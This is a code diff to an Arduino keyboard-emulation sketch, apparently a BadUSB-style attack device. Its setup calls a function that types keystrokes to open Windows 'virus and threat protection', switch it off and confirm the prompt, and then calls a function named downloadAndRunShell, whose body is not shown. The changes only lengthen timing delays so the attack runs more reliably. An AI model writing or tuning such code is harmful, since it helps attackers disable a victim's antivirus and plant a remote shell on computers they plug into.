@@ -6,7 +6,7 @@ void setup() {
   delay(1000);
 
   turnOffAV();
-  delay(200);
+  delay(1000);
   downloadAndRunShell();
 }
 
@@ -31,6 +31,7 @@ void turnOffAV()
   Keyboard.releaseAll();
   delay(500);
   Keyboard.print("virus and threat protection");
+  delay(1000);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(3000);
@@ -46,7 +47,7 @@ void turnOffAV()
   delay(100);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
-  delay(200);
+  delay(500);
   
   Keyboard.press(0x20);
   Keyboard.releaseAll();
@@ -54,6 +55,7 @@ void turnOffAV()
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press('Y');
   Keyboard.releaseAll();
+  delay(500);
 
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_F4 );
